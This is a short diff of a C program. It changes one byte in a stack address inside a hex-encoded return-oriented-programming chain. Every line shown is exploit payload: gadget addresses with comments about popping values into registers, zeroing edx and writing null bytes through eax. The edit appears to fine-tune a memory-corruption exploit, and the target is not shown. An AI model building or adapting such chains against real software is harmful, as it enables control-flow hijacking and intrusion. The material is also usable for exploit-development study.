@@ -49,7 +49,7 @@ int main(void)
                       "\x22\xA4\xBA\xBB\x84\x29\xbf\xbf" // pop the addy esp stores into ecx (future address of 16 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (16 word) to stack
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-                      "\xe1\xa0\xb9\xbb\x8d\x29\xbf\xbf" // pop addy off of stack into eax
+                      "\xe1\xa0\xb9\xbb\x8c\x29\xbf\xbf" // pop addy off of stack into eax
                       "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
                       "\x8C\x9C\xA9\xBB" // inc eax
                       "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
